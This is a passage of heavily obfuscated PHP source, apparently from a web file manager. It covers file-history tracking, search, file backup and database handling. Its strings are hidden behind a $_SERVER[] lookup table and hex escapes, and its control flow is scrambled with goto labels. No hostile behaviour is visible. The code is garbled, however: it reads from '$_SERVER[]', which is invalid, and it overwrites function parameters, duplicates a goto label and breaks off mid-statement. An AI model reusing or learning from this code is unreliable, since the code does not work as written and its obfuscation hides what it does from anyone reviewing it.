$Cͅ[$bѣ[362]][$bѣ[363]] = 1; $Cͅ[$bѣ[365]] = array(array($bѣ[404] => $fաͳ, $bѣ[1895] => $Bڒ[$bѣ[472]], $bѣ[1515] => $Bڒ[$bѣ[426]], $bѣ[409] => $bѣ[1913], $bѣ[410] => $Bڒ[$bѣ[192]], $bѣ[1517] => $bѣ[33])); } goto Bٓ; D؋ڎ: } private function eventListParse($Dꍪ, $C凌) { goto fۆ; fۆ: $a =& $_SERVER[]; $Bˏڅ = $Dꍪ[$a[365]]; $b = array_to_keyvalue($Bˏڅ, $a[33], $a[390]); goto Eߕݘ; a: $b = array_unique($b); $A؆ = array_unique(array_to_keyvalue($Bˏڅ, $a[33], $a[1523])); $Dѫ = Model($a[501])->userListInfo($A؆); goto c; EĖ: $Dꍪ[$a[365]] = $Bˏڅ; return $Dꍪ; goto Eنˎ; Eߕݘ: $c = array_to_keyvalue($Bˏڅ, $a[33], $a[1901]); foreach ($Bˏڅ as $E) { $Eօ = $E[$a[425]]; if ($E[$a[29]] == $a[515] && isset($Eօ[$a[1054]])) { $b[] = $Eօ[$a[1054]] . $a[33]; $b[] = $Eօ[$a[1055]] . $a[33]; } if ($E[$a[29]] == $a[1909] && isset($Eօ[$a[390]])) { $b[] = $Eօ[$a[390]] . $a[33]; } } $b = array_merge($b, $c, array($C凌 . $a[33])); goto a; c: $a泌 = Model($a[790])->sourceListInfo($b, !0); foreach ($Bˏڅ as &$E) { if ($E[$a[29]] == $a[515] && isset($E[$a[425]][$a[1054]])) { $E[$a[425]][$a[1054]] = $a泌[$E[$a[425]][$a[1054]]]; $E[$a[425]][$a[1055]] = $a泌[$E[$a[425]][$a[1055]]]; } if ($E[$a[29]] == $a[1909] && isset($E[$a[425]][$a[390]])) { $E[$a[425]][$a[390]] = $a泌[$E[$a[425]][$a[390]]]; } $E[$a[84]] = $a泌[$E[$a[390]]]; $E[$a[1914]] = $a泌[$E[$a[1901]]]; if ($E[$a[29]] == $a[1652]) { $E[$a[1914]] = $E[$a[84]]; $E[$a[1901]] = $E[$a[1914]][$a[390]]; $E[$a[84]] = !1; $E[$a[390]] = $a[33]; } $E[$a[1844]] = $Dѫ[$E[$a[1523]]]; } unset($E); goto EĖ; Eنˎ: } public function removeBySource($fף) { $C = array($_SERVER[][404] => $fף); $this->where($C)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\137\x73\x6f\165\162\x63\145\137\150\151\163\x74\157\162\x79"; public function historyCount($cܓͷ) { goto f; fͮ: $B֩ = array($a[390], $a[1718] => $a[474]); $EɊ = array($a[390] => array($a[7], $cܓͷ)); $f׏և؄ = $this->field($B֩)->where($EɊ)->group($a[390])->select(); goto CΗɸ; CΗɸ: return array_to_keyvalue($f׏և؄, $a[390], $a[474]); goto E; f: $a =& $_SERVER[]; if (!$cܓͷ) { return array(); } if (is_string($cܓͷ) || is_int($cܓͷ)) { $cܓͷ = array($cܓͷ); } goto fͮ; E: } public function addHistory($A򿅌, $fԭݿ = '') { $BɌг =& $_SERVER[]; $Cӳз = array($BɌг[404] => $A򿅌[$BɌг[390]], $BɌг[1515] => isset($A򿅌[$BɌг[428]]) ? $A򿅌[$BɌг[428]] : $A򿅌[$BɌг[426]], $BɌг[442] => $A򿅌[$BɌг[441]], $BɌг[543] => $A򿅌[$BɌг[77]], $BɌг[1915] => $fԭݿ); $f㙆Ǫ = $GLOBALS[$BɌг[6]][$BɌг[87]][$BɌг[1102]]; if ($f㙆Ǫ > 1) { $this->historyAutoClear($Cӳз[$BɌг[390]]); $this->add($Cӳз); } Hook::trigger($BɌг[1916], $Cӳз); Model($BɌг[1917])->eventFileEdit($A򿅌[$BɌг[390]]); } private function historyAutoClear($c̯) { goto AƇ; Aȳɰ: $this->where($Aꗊܰ)->delete(); Model($Eħ[444])->remove($a); goto aʉ; EȈ: $FŬ = $e == $Eħ[1125] ? 5 : $fՆ; if ($fՆ <= 1) { $FŬ = 1; } if ($FŬ >= 500) { return; } goto e; cĒ: $a = array_slice($a, $FŬ); if (!$a || !$a) { return; } $Aꗊܰ = array($Eħ[406] => array($Eħ[7], $a)); goto Aȳɰ; dǻ: $a = array_to_keyvalue($EŇ, $Eħ[33], $Eħ[388]); $a = array_slice($a, $FŬ); $a = array_to_keyvalue($EŇ, $Eħ[33], $Eħ[441]); goto cĒ; e: $Aꗊܰ = array($Eħ[404] => $c̯); $EŇ = $this->field($Eħ[1918])->where($Aꗊܰ)->order($Eħ[1912])->select(); if (!$EŇ || $FŬ >= count($EŇ)) { return; } goto dǻ; AƇ: $Eħ =& $_SERVER[]; $e = Model($Eħ[1123])->get($Eħ[1124]); $fՆ = $GLOBALS[$Eħ[6]][$Eħ[87]][$Eħ[1102]]; goto EȈ; aʉ: } public function listData($D) { goto eɿ; bպ: $d󋣜 = $this->field($e)->where($E޿ײ)->order($E΋[1912])->selectPage(); $this->_listAppendUser($d󋣜[$E΋[365]]); $CՆ = Model($E΋[1123])->get($E΋[1124]); goto eב; eɿ: $E΋ =& $_SERVER[]; $E޿ײ = array($E΋[404] => $D); $e = $E΋[1919]; goto bպ; eב: $A񹤈ī = 5; if ($CՆ == $E΋[1125]) { $d󋣜[$E΋[365]] = array_slice($d󋣜[$E΋[365]], 0, $A񹤈ī); $d󋣜[$E΋[362]] = array($E΋[1920] => 1, $E΋[1921] => 20, $E΋[1922] => 1, $E΋[1923] => count($d󋣜[$E΋[365]])); } return $d󋣜; goto D߆; D߆: } protected function _listAppendUser(&$e) { $D =& $_SERVER[]; $A = array_to_keyvalue($e, $D[33], $D[1523]); $A억 = Model($D[501])->userListInfo($A); foreach ($e as &$E) { $dʰ = $E[$D[1523]]; $E[$D[426]] = $A억[$dʰ] ? $A억[$dʰ] : !1; } unset($E); } public function fileInfo($F) { $F =& $_SERVER[]; $A = $this->tablePrefix; $F簣 = "{$A}\151\x6f\x5f\146\x69\x6c\145\x20\146\x69\154\x65\x73\x20\x6f\x6e\40\146\x69\154\x65\x73\56\x66\151\x6c\145\111\104\x20\x3d\40\x68\x69\x73\164\157\162\171\x2e\x66\151\x6c\x65\x49\104"; return $this->alias($F[1924])->where(array($F[406] => $F))->join($F簣, $F[1925])->find(); } public function removeItem($d) { $d =& $_SERVER[]; $cĐ = array($d[406] => $d); $bߜ = $this->where($cĐ)->find(); if ($bߜ) { $c = $this->where($cĐ)->delete(); Model($d[444])->remove($bߜ[$d[441]]); return $c; } return !1; } public function removeBySource($C) { goto F; F: $a燠 =& $_SERVER[]; if (!$C) { return !1; } if (!is_array($C)) { $C = array($C); } goto d; d: $Bȏ = array($a燠[404] => array($a燠[7], $C)); $Fޔמ = $this->field($a燠[442])->where($Bȏ)->select(); if ($Fޔמ) { $this->where($Bȏ)->delete(); $Dҹ = array_to_keyvalue($Fޔמ, $a燠[33], $a燠[441]); Model($a燠[444])->remove($Dҹ); } goto A҇; A҇: return !0; goto f; f: } public function setDetail($A, $a) { $C =& $_SERVER[]; return $this->where(array($C[406] => $A))->save(array($C[1915] => $a)); } public function rollbackToItem($F﵃, $d) { goto a؃Ũ; b: return $this->where(array($BР[406] => $d))->delete(); goto Dﰱ۵; a؃Ũ: $BР =& $_SERVER[]; $Ȩ = Model($BР[790])->sourceInfo($F﵃); $this->addHistory($Ȩ, LNG($BР[1926])); goto f; f: $A슠 = $this->find($d); $d̍ = array($BР[441] => $A슠[$BР[441]], $BР[77] => $A슠[$BР[77]], $BР[83] => time(), $BР[428] => USER_ID); Model($BР[790])->where(array($BР[390] => $F﵃))->save($d̍); goto b; Dﰱ۵: } public function clearSame($b) { goto Cʕ; a: if (!$d) { return; } $this->where(array($bӞ[388] => array($bӞ[7], $d)))->delete(); Model($bӞ[444])->remove($B򘘰); goto d; Cʕ: $bӞ =& $_SERVER[]; $D֝ = $this->listData($b); $F = array_to_keyvalue_group($D֝, $bӞ[441]); goto aݽ; aݽ: $B򘘰 = array(); $d = array(); foreach ($F as $f℺ѥ) { if (!$f℺ѥ || count($f℺ѥ) <= 1) { continue; } foreach ($f℺ѥ as $Fݠ) { $B򘘰[] = $Fݠ[$bӞ[441]]; $d[] = $Fݠ[$bӞ[388]]; } } goto a; d: } public function userSpace() { $b =& $_SERVER[]; $cʈ = $this->tablePrefix; $e = array($b[1515] => USER_ID); $Cͪ = "{$cʈ}\151\x6f\x5f\x66\x69\x6c\145\40\146\151\x6c\x65\x73\40\157\156\40\x66\151\154\x65\163\56\146\151\x6c\x65\111\x44\40\x3d\x20\x68\x69\x73\164\157\x72\171\x2e\x66\x69\x6c\145\x49\x44"; return $this->alias($b[1924])->where($e)->join($Cͪ, $b[1925])->sum($b[77]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($D) { goto Aį; Aį: $Fԏ =& $_SERVER[]; $BЯ = KodIO::fileTypeList(); $e = $BЯ[$D]; goto eߌÝ; eę: if (!$e[$Fԏ[167]]) { $E펄 = array_to_keyvalue($BЯ, $Fԏ[33], $Fԏ[167]); $bƒ¼ = implode($Fԏ[47], $E펄); $Bςˆ = $Fԏ[1927]; } $Fя = explode($Fԏ[47], trim($bƒ¼, $Fԏ[47])); return array($Bςˆ, $Fя); goto D䶈; eߌÝ: if (!$e) { return array(); } $bƒ¼ = $e[$Fԏ[167]]; $Bςˆ = $Fԏ[7]; goto eę; D䶈: } public function listPathType($A̾) { $C⿶╱ =& $_SERVER[]; $e = $this->fileTypeWhere($A̾); if (!$e) { return array(); } $C = array($C⿶╱[544] => SourceModel::TYPE_USER, $C⿶╱[545] => USER_ID, $C⿶╱[541] => 0, $C⿶╱[542] => $e); return $this->listSource($C); } public function listSearch($C, $C = 300) { goto B; c: if (!isset($b[$bظ[417]])) { $b[$bظ[417]] = 0; } $CΔ = $bظ[1929]; $Eɠ = $CΔ; goto a؏ʱ; B: $bظ =& $_SERVER[]; if (isset($C[$bظ[1770]]) && $C[$bظ[1770]]) { $C[$bظ[1770]] = str_replace($bظ[379], $bظ[1928], trim($C[$bظ[1770]])); } $b = $this->_parseSearchWhere($C); goto c; B: $this->_listSearchGroupTag($bŕ, $C, $Eɠ); $this->_listDataApply($bŕ[$bظ[365]]); $this->_listMake($bŕ); goto F቏; F቏: return $bŕ; goto a׆; Dһ: $bŕ = $this->distinct(!0)->field($CΔ)->where($b)->selectPage($C); $this->_listSearchDesc($bŕ, $C, $Eɠ); $this->_listSearchTag($bŕ, $C, $Eɠ); goto B; a؏ʱ: $this->_listSearchBindPinyin($C, $b, $CΔ); $this->alias($bظ[511])->_makeOrder(); $b = $this->parseWhereLike($b); goto Dһ; a׆: } private function _listSearchTag(&$D붘, $Eݾ, $aؕ) { goto EӺ整; EӺ整: $e =& $_SERVER[]; if (!$Eݾ[$e[1770]] || $D붘[$e[362]][$e[349]] > 1) { return; } $d⯄ = Model($e[1930])->listData(); goto Eޅ; Eޅ: $Cϲ = array(); $b = $Eݾ[$e[1770]]; foreach ($d⯄ as $D呢) { $fˉ = $D呢[$e[28]]; $BܲѤ = str_replace($e[50], $e[33], Pinyin::encode($fˉ)); if (stripos($fˉ, $b) !== !1 || stripos($BܲѤ, $b) !== !1) { $Cϲ[] = $D呢[$e[388]]; } } goto Aٶ; bν: $Eґ = array_to_keyvalue($Eґ, $e[33], $e[75]); $D߲ = array_unique($Eґ); $this->_listSearchMerge($D붘, $Eݾ, $aؕ, $D߲); goto a; Aٶ: if (!$Cϲ) { return; } $f󋃜 = array($e[413] => array($e[7], $Cϲ), $e[1523] => USER_ID); $Eґ = Model($e[414])->field($e[75])->where($f󋃜)->select(); goto bν; a: } private function _listSearchDesc(&$cƥݿ, $F׆, $cܨ¬) { goto C培; C培: $A鐘Ԉ =& $_SERVER[]; if (!$F׆[$A鐘Ԉ[1770]] || $cƥݿ[$A鐘Ԉ[362]][$A鐘Ԉ[349]] > 1) { return; } $EŽ = $this->listSearchChildren($F׆[$A鐘Ԉ[472]]); goto a˿ٿ; b: $Fד = Model($A鐘Ԉ[527])->field($A鐘Ԉ[390])->where($aǓ͵)->select(); $E = array_to_keyvalue($Fד, $A鐘Ԉ[33], $A鐘Ԉ[390]); $this->_listSearchMerge($cƥݿ, $F׆, $cܨ¬, $E); goto aм; a˿ٿ: $EŽ = array_unique($EŽ); if (!$EŽ) { return; } $aǓ͵ = array($A鐘Ԉ[390] => array($A鐘Ԉ[7], $EŽ), $A鐘Ԉ[92] => $A鐘Ԉ[425], $A鐘Ԉ[370] => array($A鐘Ԉ[378], $A鐘Ԉ[1772] . $F׆[$A鐘Ԉ[1770]] . $A鐘Ԉ[1772])); goto b; aм: } private function _listSearchGroupTag(&$EУ, $B, $f󱦳) { goto A; f: $AϤ = array(); $a = $B[$A[1770]]; foreach ($a[$A[365]] as $c) { $d䙻 = $c[$A[28]]; $a = str_replace($A[50], $A[33], Pinyin::encode($d䙻)); if (stripos($d䙻, $a) !== !1 || stripos($a, $a) !== !1) { $AϤ[] = $c[$A[388]]; } } goto a۟; B: $b = array_to_keyvalue($b, $A[33], $A[75]); $C۟ = array_unique($b); $this->_listSearchMerge($EУ, $B, $f󱦳, $C۟); goto FĮ; a۟: if (!$AϤ) { return; } $bߤ = array($A[413] => array($A[7], $AϤ), $A[1523] => 0, $A[29] => $A[1794] . $D); $b = Model($A[414])->field($A[75])->where($bߤ)->select(); goto B; E: if (!$E || $E[$A[398]] != SourceModel::TYPE_GROUP) { return; } $D = $E[$A[478]]; $a = Model($A[1931])->get($D); goto f; A: $A =& $_SERVER[]; if (!$B[$A[1770]] || $EУ[$A[362]][$A[349]] > 1 || !$B[$A[472]]) { return; } $E = $this->sourceInfo($B[$A[472]]); goto E; FĮ: } private function _listSearchMerge(&$fۆ, $F˚, $c셐, $cכ) { goto cЈ; eǜ: foreach ($E˒ǆ as $fڏ) { if ($this->_listSearchFilter($fڏ, $F˚)) { $eގ[] = $fڏ; } } $fۆ[$EÍ[365]] = array_merge($eގ, $fۆ[$EÍ[365]]); $fۆ[$EÍ[362]][$EÍ[363]] += count($eގ); goto D֓; cЈ: $EÍ =& $_SERVER[]; if (!$cכ) { return; } $b = array_to_keyvalue($fۆ[$EÍ[365]], $EÍ[33], $EÍ[390]); goto AԤ; AԤ: $A찣 = array_diff($cכ, $b); if (!$A찣) { return; } $Bљ = array($EÍ[390] => array($EÍ[7], $A찣)); goto f琤; f琤: $E˒ǆ = $this->field($c셐)->where($Bљ)->select(); if (!$E˒ǆ) { return; } $eގ = array(); goto eǜ; D֓: } private function _listSearchFilter($FéՒ, $fɔ) { goto cе; e͑: if (isset($fɔ[$aۇ[557]]) && $fɔ[$aۇ[557]] != $FéՒ[$aۇ[428]]) { return !1; } return !0; goto D; F: if (isset($fɔ[$aۇ[399]]) && $fɔ[$aۇ[399]] != $aۇ[1737]) { if ($fɔ[$aۇ[399]] == $aۇ[76] && !$cވ݇) { return !1; } if ($fɔ[$aۇ[399]] != $aۇ[76] && $cވ݇) { return !1; } if (!strstr($FéՒ[$aۇ[167]], $aۇ[47] . $fɔ[$aۇ[399]] . $aۇ[47])) { return !1; } } if (isset($fɔ[$aۇ[1932]]) && $fɔ[$aۇ[1932]] < $FéՒ[$aۇ[77]]) { return !1; } if (isset($fɔ[$aۇ[1933]]) && $fɔ[$aۇ[1933]] > $FéՒ[$aۇ[77]]) { return !1; } goto e͑; cе: $aۇ =& $_SERVER[]; $cވ݇ = $FéՒ[$aۇ[397]] == $aۇ[86]; if (!strstr($FéՒ[$aۇ[481]], $aۇ[47] . $fɔ[$aۇ[472]] . $aۇ[47])) { return !1; } goto F; D: } public function listSearchChildren($b᬴, $e腸׃ = 5000) { goto cұ; fά: $cΎ = $this->field($Aȏ[390])->where($f娈)->select(); $Dꢚף = array_to_keyvalue($cΎ, $Aȏ[33], $Aȏ[390]); return $Dꢚף; goto Bԉ; F戮: $f娈 = array($Aȏ[481] => array($Aȏ[378], $eՎ[$Aȏ[481]] . $eՎ[$Aȏ[390]] . $Aȏ[508])); $D = $this->field($Aȏ[390])->cache(null, 600)->where($f娈)->count(); if ($D > $e腸׃) { return $this->_listSearchChildrenNear($b᬴, $e腸׃); } goto fά; cұ: $Aȏ =& $_SERVER[]; $Dꢚף = array(); $eՎ = $this->sourceInfo($b᬴); goto F戮; Bԉ: } private function _listSearchChildrenNear($b鉐, $b쨭) { goto a刿; Fĥ: if (!$E) { return $C°; } $aӼ = array($c[472] => array($c[7], $E)); $F = $this->field($c[1934])->where($aӼ)->limit($b쨭)->select(); goto Eܭˤ; a刿: $c =& $_SERVER[]; $C° = array(); $aӼ = array($c[472] => $b鉐); goto C; C: $F = $this->field($c[1934])->where($aӼ)->select(); $E = array_to_keyvalue(array_filter_by_field($F, $c[397], $c[86]), $c[33], $c[390]); $C° = array_merge($C°, array_to_keyvalue($F, $c[33], $c[390])); goto Fĥ; Eܭˤ: $C° = array_merge($C°, array_to_keyvalue($F, $c[33], $c[390])); $C° = array_slice($C°, 0, $b쨭); return $C°; goto B׻; B׻: } private function _listSearchBindPinyin($dέ, &$e©أ, &$a) { goto b섴; E: $a = $bϳ[1936] . str_replace($bϳ[47], $bϳ[1937], $a); $Eޑ = $e©أ[$bϳ[28]]; unset($e©أ[$bϳ[28]]); goto bܒ; a: $Dƣ = "\114\x45\x46\124\40\112\117\x49\116\x20{$this->tablePrefix}\151\x6f\x5f\163\157\165\162\x63\145\137\155\x65\x74\x61\40\x6d\145\164\141\40\157\x6e\40\163\157\165\x72\x63\145\56\163\x6f\x75\x72\143\x65\x49\104\40\75\x20\155\145\x74\141\56\163\x6f\x75\x72\x63\x65\x49\x44"; $f϶ = array(); $a = str_replace(array($bϳ[227], $bϳ[50], $bϳ[1935]), $bϳ[33], $a); goto E; b۝: $e©أ = $f϶; goto Ḋك; b섴: $bϳ =& $_SERVER[]; if (!isset($dέ[$bϳ[1770]]) || !$dέ[$bϳ[1770]]) { return; } if (!Input::check($dέ[$bϳ[1770]], $bϳ[314]) || strlen($dέ[$bϳ[1770]]) < 2) { return; } goto a; bܒ: foreach ($e©أ as $A؄ܞ => $fṧգ) { $f϶[$bϳ[1936] . $A؄ܞ] = $fṧգ; } foreach ($Eޑ as $Dِ) { $f϶[] = array($bϳ[1938] => $Dِ, $bϳ[957] => $bϳ[1774], array($bϳ[1939] => $Dِ, $bϳ[1940] => array($bϳ[7], array($bϳ[438], $bϳ[437])))); } $this->join($Dƣ); goto b۝; Ḋك: } private function _parseSearchWhere($B) { goto DÃ; a: if (isset($B[$Bˎ[470]]) && $B[$Bˎ[470]]) { $E = array($Bˎ[1942], $B[$Bˎ[470]]); if ($C١[$Bˎ[83]]) { $C١[$Bˎ[83]] = array($C١[$Bˎ[83]], $E, $Bˎ[1943]); } else { $C١[$Bˎ[83]] = $E; } } if (isset($B[$Bˎ[1932]]) && $B[$Bˎ[1932]] > 0) { $C١[$Bˎ[77]] = array($Bˎ[1941], $B[$Bˎ[1932]]); } if (isset($B[$Bˎ[1933]]) && $B[$Bˎ[1933]]) { $E = array($Bˎ[1942], $B[$Bˎ[1933]]); if ($C١[$Bˎ[77]]) { $C١[$Bˎ[77]] = array($C١[$Bˎ[77]], $E, $Bˎ[1943]); } else { $C١[$Bˎ[77]] = $E; } } goto Dފظ; Dފظ: if (isset($B[$Bˎ[557]]) && $B[$Bˎ[557]]) { $C١[] = array($Bˎ[428] => $B[$Bˎ[557]], $Bˎ[426] => $B[$Bˎ[557]], $Bˎ[957] => $Bˎ[1774]); } if (isset($B[$Bˎ[399]]) && $B[$Bˎ[399]]) { $Dʧ̻ = $B[$Bˎ[399]]; if ($Dʧ̻ == $Bˎ[76]) { $C١[$Bˎ[397]] = 1; } else { if ($Dʧ̻ == $Bˎ[1944]) { $C١[$Bˎ[397]] = 0; } else { if ($Dʧ̻) { $Dʧ̻ = is_array($Dʧ̻) ? $Dʧ̻ : explode($Bˎ[47], $Dʧ̻); $C١[$Bˎ[399]] = array($Bˎ[405], $Dʧ̻); $C١[$Bˎ[397]] = 0; } } } } if (isset($B[$Bˎ[472]]) && $B[$Bˎ[472]]) { $C = $this->sourceInfo($B[$Bˎ[472]]); $C١[$Bˎ[548]] = array($Bˎ[507], $C[$Bˎ[481]] . $B[$Bˎ[472]] . $Bˎ[508]); } goto d㋰; d㋰: if (isset($B[$Bˎ[1770]]) && trim($B[$Bˎ[1770]])) { $Cƥ = trim($B[$Bˎ[1770]]); $b = explode($Bˎ[50], $Cƥ); if (strlen($Cƥ) > 2 && (substr($Cƥ, 0, 1) == $Bˎ[115] && substr($Cƥ, -1) == $Bˎ[115]) || substr($Cƥ, 0, 1) == $Bˎ[55] && substr($Cƥ, -1) == $Bˎ[55]) { $Cƥ = substr($Cƥ, 1, -1); $b = array($Cƥ); } $C١[$Bˎ[28]] = array(array($Bˎ[507], $Bˎ[1772] . $Cƥ . $Bˎ[1772])); if (count($b) > 1) { $C١[$Bˎ[28]] = array(); foreach ($b as $d퍈) { if (!trim($d퍈)) { continue; } $C١[$Bˎ[28]][] = array($Bˎ[507], $Bˎ[1772] . trim($d퍈) . $Bˎ[1772]); } } } return $C١; goto b; DÃ: $Bˎ =& $_SERVER[]; $C١ = array(); if (isset($B[$Bˎ[738]]) && $B[$Bˎ[738]]) { $C١[$Bˎ[83]] = array($Bˎ[1941], $B[$Bˎ[738]]); } goto a; b: } } goto bӸ; bյ: class BackupFile { public function __construct() { } public function index() { goto FΝ; aީ: $this->_fileFilter($Bʄӑ); return !0; goto f̪; AĦ: $e->task[$_SERVER[][734]] = $dω; $bܧ뜑 = array($_SERVER[][778] => $A췶, $_SERVER[][779] => $dω); Backup::set($bܧ뜑); goto dϽ; cжߪ: $bܟ = 1000; $C = $a = 0; $Bʄӑ = array(); goto aΪ; FΝ: $fμ̪ = Backup::get(); $e = $fμ̪[$_SERVER[][289]][$_SERVER[][173]][$_SERVER[][441]]; $D = array($_SERVER[][442] => array($_SERVER[][774], $e), $_SERVER[][775] => array($_SERVER[][327], $fμ̪[$_SERVER[][727]])); goto Aܺۈ; a: $bܧ뜑 = array($_SERVER[][789] => 1, $_SERVER[][470] => time(), $_SERVER[][744] => 1, $_SERVER[][786] => $e, $_SERVER[][779] => $dω, $_SERVER[][778] => $A췶); if ($a) { $bܧ뜑[$_SERVER[][787]] = $Bۅħ; $bܧ뜑[$_SERVER[][788]] = $dũɧ; } Backup::set($bܧ뜑); goto aީ; Aܺۈ: $A췶 = (int) Model($_SERVER[][754])->where($D)->count($_SERVER[][441]); $dω = (int) Model($_SERVER[][754])->where($D)->sum($_SERVER[][77]); $e = new TaskFileTransfer($_SERVER[][776], $_SERVER[][749], $A췶, LNG($_SERVER[][750]) . $_SERVER[][751] . LNG($_SERVER[][777])); goto AĦ; dϽ: $dŵ = !0; $a̎ = $this->storeIds(); $f = 1; goto cжߪ; aΪ: $dũɧ = $Bۅħ = 0; do { $E经ެ = $_SERVER[][780]; $cȊ = Model($_SERVER[][754])->where($D)->field($E经ެ)->order($_SERVER[][781])->selectPage($bܟ, $f); $eҙߥ = !empty($cȊ[$_SERVER[][365]]) ? $cȊ[$_SERVER[][365]] : array(); foreach ($eҙߥ as $DތѲ) { goto eՔ; eՔ: if (!$this->_fileExist($DތѲ, $Bʄӑ, $a̎)) { $A췶 -= 1; $dω -= (int) $DތѲ[$_SERVER[][77]]; write_log("\x66\x69\154\x65\40\x6e\157\x74\x20\145\x78\151\163\x74\56\x66\x69\154\x65\x49\x44\x3a{$DތѲ[$_SERVER[][441]]}\x2c\40\160\x61\x74\150\x3a{$DތѲ[$_SERVER[][75]]}", $_SERVER[][782]); continue; } $a¼ = $DތѲ[$_SERVER[][75]]; $e쵲ȷ = "\173\x69\157\72{$fμ̪[$_SERVER[][727]]}\x7d" . substr($a¼, strlen("\x7b\151\x6f\x3a{$DތѲ[$_SERVER[][783]]}\x7d")); goto E; f؎: $C += $DތѲ[$_SERVER[][77]]; $Bۅħ += 1; $dũɧ += $DތѲ[$_SERVER[][77]]; goto D; D: if ($C >= 1024 * 1024 * 100) { $bܧ뜑 = array($_SERVER[][786] => $e, $_SERVER[][787] => $Bۅħ, $_SERVER[][788] => $dũɧ); Backup::set($bܧ뜑); $C = $a = 0; } goto BѢĦ; E: if (IO::exist($e쵲ȷ)) { $e->updateFileEnd($DތѲ[$_SERVER[][28]], $DތѲ[$_SERVER[][77]]); } else { $e쵲ȷ = get_path_father($e쵲ȷ); IO::mkdir($e쵲ȷ); if (!IO::copy($a¼, $e쵲ȷ, $_SERVER[][784])) { write_log($_SERVER[][785] . $a¼ . $_SERVER[][770] . $e쵲ȷ . $_SERVER[][499], $_SERVER[][749]); $dŵ = !1; break; } } $e = $DތѲ[$_SERVER[][441]]; $a += 1; goto f؎; BѢĦ: } $eޘ = count($eҙߥ); $f++; } while ($eޘ == $bܟ); $e->end(); goto a; f̪: } private function _fileExist($B٘χ, &$dب, $C) { goto eלϗ; EĊ: $dب = array_merge($dب, array_to_keyvalue($D, $eփ[33], $eփ[441])); return !1; goto F; eʏ: if (!in_array($B٘χ[$eփ[783]], $C)) { return !1; } if (IO::exist($c§)) { return !0; } $AΞ = get_path_father($c§); goto cՏ; cՏ: if (IO::exist($AΞ)) { $dب[] = $B٘χ[$eփ[441]]; return !1; } $a = array($eփ[783] => $B٘χ[$eփ[783]], $eփ[75] => array($eփ[378], "{$AΞ}\x25")); $D = Model($eփ[754])->where($a)->field($eփ[442])->select(); goto EĊ; eלϗ: $eփ =& $_SERVER[]; $c§ = $B٘χ[$eփ[75]]; if (in_array($B٘χ[$eփ[441]], $dب)) { return !1; } goto eʏ; F: } private function _fileFilter($A) { $F潢Ƞ =& $_SERVER[]; if (empty($A)) { return; } $cدû = array($F潢Ƞ[441] => array($F潢Ƞ[7], array_unique($A))); $Añ䓒 = Model($F潢Ƞ[790])->where($cدû)->field($F潢Ƞ[390])->select(); foreach ($Añ䓒 as $cާע) { Model($F潢Ƞ[790])->remove($cާע[$F潢Ƞ[390]], !1); } } private function storeIds() { $Cҷݼ =& $_SERVER[]; $e = Model($Cҷݼ[739])->listData(); $C֦ = array(); $fڗ = $GLOBALS[$Cҷݼ[6]][$Cҷݼ[87]][$Cҷݼ[791]]; foreach ($e as $a) { $B = strtolower($a[$Cҷݼ[93]]); if (!isset($fڗ[$B])) { continue; } $E͝л = $Cҷݼ[71] . (isset($fڗ[$B]) ? $fڗ[$B] : ucfirst($B)); if (!class_exists($E͝л)) { continue; } $C֦[] = $a[$Cҷݼ[388]]; } return $C֦; } } $a×ן = $_SERVER[$_SERVER[][792]]; $d = $_SERVER[][793]; goto cÜ; E֋: define($_SERVER[][235], 2); define($_SERVER[][236], 3); define($_SERVER[][237], 1); goto dƣ; dп: class DbManage { function __construct($F, $fǟ = '') { $this->database = $F; $this->type = $fǟ; } public function model($Cή = '') { return new ModelBase($Cή, $_SERVER[][33], $this->database); } public function db($fچ = false) { goto fϽ; c: $eܬ = $FŎ岶[$f[929]]; $FŎ岶[$f[929]] = $f[33]; if ($FŎ岶[$f[760]] == $f[761]) { $f = $FŎ岶[$f[762]]; $FŎ岶[$f[762]] = substr($f, 0, strrpos($f, $f[1017])); } goto d孹; b: $this->database = $FŎ岶; $Fȇ->execute("\x75\163\145\40\x60{$eܬ}\x60"); return $Fȇ; goto Aխ; d孹: $this->database = $FŎ岶; $Fȇ = $this->model()->db(); try { $Bƻ碃 = $Fȇ->execute("\x73\x68\x6f\x77\x20\144\141\164\x61\x62\141\x73\145\x73\40\154\x69\x6b\145\40\x27{$eܬ}\47"); } catch (Exception $Cܾ) { } goto C; fϽ: $f =& $_SERVER[]; $FŎ岶 = array_change_key_case($this->database); if ($this->type == $f[9] || !$fچ) { return $this->model()->db(); } goto c; C: if (!$Bƻ碃) { $Fȇ->execute("\143\x72\145\141\x74\x65\40\x64\141\164\x61\x62\141\x73\x65\40\140{$eܬ}\140"); } $FŎ岶[$f[929]] = $eܬ; if ($FŎ岶[$f[760]] == $f[761]) { $FŎ岶[$f[762]] .= $f[1017] . $eܬ; } goto b; Aխ: } public function createTable($d, $Bׄ = null) { $D촃 =& $_SERVER[]; if (!IO::exist($d)) { ActionCall($D촃[1018], !0, 0); show_json(LNG($D촃[1019]), !1); } $Fž = sqlSplit(IO::getContent($d)); foreach ($Fž as $d) { if ($Bׄ) { $e = stripos($d, $D촃[1020]) === 0; if ($e) { $Bׄ->task[$D촃[1021]] += 1; } } $this->model()->db()->execute($d); if ($Bׄ && $e) { preg_match($D촃[1022], $d, $d); $Bׄ->task[$D촃[1023]] = $d[1]; $Bׄ->update(1); } } $this->taskToCache($Bׄ); } public function insertTable($Eۗӛԫ, $a = null) { $b =& $_SERVER[]; $fΘװ = $this->model()->db(); $Eȝ = $DЛ⼵ ? array($DЛ⼵) : $fΘװ->getTables(); foreach ($Eۗӛԫ as $C테Ы) { $DЛ⼵ = basename($C테Ы, $b[753]); if (!in_array($DЛ⼵, $Eȝ)) { continue; } if ($a) { $a->task[$b[1023]] = $DЛ⼵; } if (get_filesize($C테Ы) == 0) { continue; } $C = $this->sqlToDb($C테Ы, $a); if (!$C) { ActionCall($b[1018], !0, 0); show_json(LNG($b[1024]) . "\133{$DЛ⼵}\135", !1); } } $this->taskToCache($a); } public function sqlFromDb($d֞, $e, $Fᑊ = null, $e = null) { goto aڻ; aڻ: if ($Fᑊ) { $Fᑊ->task[$_SERVER[][1023]] = $d֞; } $e¿ = $this->model($d֞); $b䭌ۛ = 0; goto CƦ؏; CƦ؏: $bש͸ = 1; $D = 500; $Bɫ = fopen($e, $_SERVER[][1025]); goto cڃڂ; f䕝: fclose($Bɫ); return $b䭌ۛ; goto Eώ; cڃڂ: $a񽸰 = $e¿->getPk(); $bˏ뽜 = $e¿->getDbFields(); do { $eҏ = $e¿->field($bˏ뽜)->order($a񽸰 . 